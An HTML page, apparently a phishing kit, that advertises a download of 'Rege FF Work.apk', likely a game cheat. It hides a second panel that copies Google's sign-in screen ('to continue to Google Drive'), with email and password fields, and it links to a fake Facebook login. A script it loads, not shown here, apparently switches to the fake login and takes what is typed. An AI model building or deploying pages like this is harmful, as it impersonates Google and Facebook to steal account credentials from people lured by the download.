<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="style.css">
    <title>Download File</title>
</head>
<body>
    <!-- Downloader Page -->
    <div class="container" id="downloadPage">
        <div class="file-info">
            <img src="https://pomf2.lain.la/f/lajakxn.jpg" alt="File Icon">
            <div class="file-name">Rege FF Work.apk</div>
            <div class="file-size">Size: 25 MB</div>
        </div>
        <a class="download-btn" id="downloadBtn" href="#">Download</a>
    </div>

    <!-- Login Page -->
    <div class="login-container" id="loginPage" style="display: none;">
        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo" class="google-logo" width="120">
        <h2>Sign in</h2>
        <p>to continue to Google Drive</p>
        <form id="loginForm">
            <input type="email" id="email" name="email" placeholder="Email or phone" required>
            <input type="password" id="password" name="password" placeholder="Enter your password" required>
            <button type="submit">Next</button>
        </form>
        <div class="footer">
            <p>Not your computer? Use a private browsing window to sign in.<a href="facebook.html">Login In Facebook</a></p>
        </div>
    </div>
	<script src="main.js"></script>
</body>
</html>
